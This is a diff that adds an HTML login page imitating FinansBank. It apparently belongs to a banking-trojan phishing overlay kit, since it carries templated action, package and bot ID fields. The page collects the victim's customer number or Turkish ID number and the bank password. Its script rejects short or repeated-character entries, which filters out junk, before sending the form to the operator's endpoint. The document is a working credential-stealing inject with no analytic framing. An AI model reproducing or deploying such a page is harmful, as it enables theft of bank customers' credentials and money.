@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title>FinansBank</title>
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/main.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/finansbank.css">
+
+    <script src="%DYN_PATH%/js/jquery.min.js"></script>
+    <script src="%DYN_PATH%/js/viewport.js"></script>
+    <script src="%DYN_PATH%/js/cat.functions.js"></script>
+</head>
+
+<body>
+    <div class="row">
+        <div class="form_header">
+            <img src="%DYN_PATH%/images/logo.png" alt="">
+        </div>
+    </div>
+		<div class="modal modal_02">
+			<div class="container">
+				<form id="mainform" method='post' action='%ACTION%' class="wrapper">
+				<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+
+
+<script>
+
+function checkBad(str)
+{
+if (str.split(str.slice(0,1)).length === str.length+1) return false;
+return true;
+}
+
+
+
+$(document).ready(function() {
+
+
+
+$('.main_input').bind("change keyup input click", function() {
+    if (this.value.match(/[^0-9]/g)) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    }
+});
+
+
+
+
+$('#row_pers .sign_btn').click(function(){
+if (($('#row_pers input').eq(0).val().length < 5) || (!checkBad($('#row_pers input').eq(0).val()))) {$('#row_pers input').eq(0).addClass('inpError'); $('#row_pers input').eq(0).focus(); return false;} else $('#row_pers input').eq(0).removeClass('inpError');
+if (($('#row_pers input').eq(1).val().length < 5) || (!checkBad($('#row_pers input').eq(1).val()))) {$('#row_pers input').eq(1).addClass('inpError'); $('#row_pers input').eq(1).focus(); return false;} else $('#row_pers input').eq(1).removeClass('inpError');
+sendForm(true);
+//closeWindow();
+return false;
+});
+
+});
+</script>
+<style>
+
+.inpError{
+border: 2px solid red;
+
+}
+</style>
+
+
+					<div class="row" id="row_pers">
+						<div class="content">
+							<div class="input_block_wr">
+								<div class="inp_caption">
+								M&#252;&#351;teri Numaras&#305; / TCKN
+								</div>
+								<div class="inp_wr">
+									<input type="text" name="fields[number]" class="main_input" maxlength=11  required="">
+								</div>
+							</div>
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									Finans&#350;ifre
+								</div>
+								<div class="inp_wr">
+									<input type="password" name="fields[password]" class="main_input" maxlength=6  required="">
+								</div>
+							</div>
+							<div class="btn_wr">
+								<button class="sign_btn">
+									&#304;leri <img src="%DYN_PATH%/images/arr.png" alt="">
+								</button>
+							</div>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+</body>
+
+</html>
